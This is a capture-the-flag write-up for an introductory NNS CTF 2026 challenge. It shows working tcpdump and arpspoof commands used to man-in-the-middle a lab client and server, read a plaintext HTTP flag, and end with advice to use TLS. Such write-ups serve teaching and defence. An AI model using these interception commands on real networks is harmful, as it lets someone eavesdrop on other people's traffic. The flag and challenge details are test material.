---
title: "Hiding in Your Wi-Fi"
description: "We land on a machine at 10.10.10.66 with arpspoof and tcpdump available. The network contains:"
event: "nns"
category: "devsec"
categoryLabel: "DevSec"
tags: ["NNS CTF 2026","devsec"]
date: "2026-09-05"
teammate: false
source: "NNS/devsec/1/writeup.md"
---

## Challenge Info

- **Category:** DevSec
- **Points:** 1
- **Difficulty:** Introductory

## Reconnaissance

We connect to the attacker box via ncat:

```
ncat --ssl hiding-in-your-wifi-0198be60585f.chall.nnsc.tf 1337
```

We land on a machine at `10.10.10.66` with `arpspoof` and `tcpdump` available. The network contains:

| Host       | IP           | Role       |
|------------|--------------|------------|
| Client     | 10.10.10.20  | Fetching data |
| Server     | 10.10.10.10  | Serving data  |
| Us         | 10.10.10.66  | MITM attacker |

IP forwarding is already enabled (`/proc/sys/net/ipv4/ip_forward = 1`).

## Attack

The client periodically makes HTTP requests to the server. Since there's no encryption mentioned, we perform an ARP spoofing MITM attack to intercept the traffic.

### Step 1: Start packet capture

```bash
tcpdump -i eth0 -w /tmp/capture.pcap host 10.10.10.20 and host 10.10.10.10 &
```

### Step 2: ARP spoof both directions

Tell the client we are the server:
```bash
arpspoof -i eth0 -t 10.10.10.20 10.10.10.10 &
```

Tell the server we are the client:
```bash
arpspoof -i eth0 -t 10.10.10.10 10.10.10.20 &
```

ARP replies are sent continuously:
```
2:0:0:0:0:66 2:0:0:0:0:20 0806 42: arp reply 10.10.10.10 is-at 2:0:0:0:0:66
2:0:0:0:0:66 2:0:0:0:0:10 0806 42: arp reply 10.10.10.20 is-at 2:0:0:0:0:66
```

### Step 3: Capture and analyze traffic

After ~30 seconds, the captured pcap shows the client repeatedly requesting `/flag.txt` over plain HTTP:

```
GET /flag.txt HTTP/1.1
```

The server responds with:

```
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 68
```

Reading the hex dump from `tcpdump -X` reveals the response body at offset `0x0110`:

```
NNS{sw1tch3d_n37W0rks_5til1_7RUs7_4rp_5o_ke3P_y0ur_D3v1C35_5eparate}
```

## Flag

```
NNS{sw1tch3d_n37W0rks_5til1_7RUs7_4rp_5o_ke3P_y0ur_D3v1C35_5eparate}
```

## Key Takeaway

Even on a switched network, ARP spoofing allows an attacker on the same LAN to intercept traffic between two hosts. The client and server communicated over unencrypted HTTP, making it trivial to extract the flag from captured packets. On real networks, use encrypted protocols (HTTPS/TLS) to protect data in transit.
